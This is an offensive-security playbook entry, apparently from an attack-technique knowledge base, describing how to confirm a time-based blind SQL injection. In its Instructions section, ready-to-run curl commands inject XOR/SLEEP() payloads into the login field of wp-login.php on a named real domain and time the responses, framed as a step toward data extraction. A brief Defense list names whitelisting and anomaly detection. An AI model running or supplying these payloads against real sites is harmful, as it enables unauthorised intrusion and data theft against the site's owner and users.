---
id: proc-confirm-sqli-variations-001
tags:
  - sqli
  - blind-sqli
  - verification
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-inject-sleep-6]]'
  - '[[commands/curl-inject-sleep-0]]'
  - '[[commands/curl-inject-sleep-3]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:09.894Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm SQLi with Varying Sleep Durations

## Summary

This procedure verifies the SQL injection vulnerability by injecting payloads with different SLEEP() durations into the log parameter, establishing proportional response delays to rule out false positives.

## Description

By varying sleep times (e.g., 0s, 3s, 6s), attackers confirm the injection point's behavior. Baseline (sleep(0)) should be fast, while others scale linearly, indicating successful SQL execution in the login query. This refines payloads for further exploitation like data extraction.

## Requirements

1. Successful initial injection from prior step
2. Timing measurement capability
3. Multiple test iterations for consistency

## Defense

Defensive measures and detection strategies:

- Implement query whitelisting to block SLEEP() and similar functions
- Use anomaly detection for response time spikes in login endpoints
- Enable database logging for injected queries

## Objectives

1. Establish baseline response time
2. Correlate delays with payload values
3. Confirm vulnerability persistence

## Instructions

### Step 1: Baseline Test (No Delay)

**Context**: Inject sleep(0) to measure normal processing time.

**Command** ([[commands/curl-inject-sleep-0]]):
```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

> Expect ~0.9-1.2s response.

### Step 2: Short Delay Test

**Context**: Use sleep(3) and sleep(6) to observe scaling.

**Command** ([[commands/curl-inject-sleep-3]]):
```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

> ~3.5s expected.

**Command** ([[commands/curl-inject-sleep-6]]):
```bash
curl -X POST https://www.acronis.cz/wp-login.php -d "log=0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z&pwd=test&wp-submit=Log+In" -w "%{time_total}s"
```

> ~7-8s expected.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-sleep-6]]
- [[commands/curl-inject-sleep-0]]
- [[commands/curl-inject-sleep-3]]

## Tools Used


## Tags

- sqli
- blind-sqli
- verification

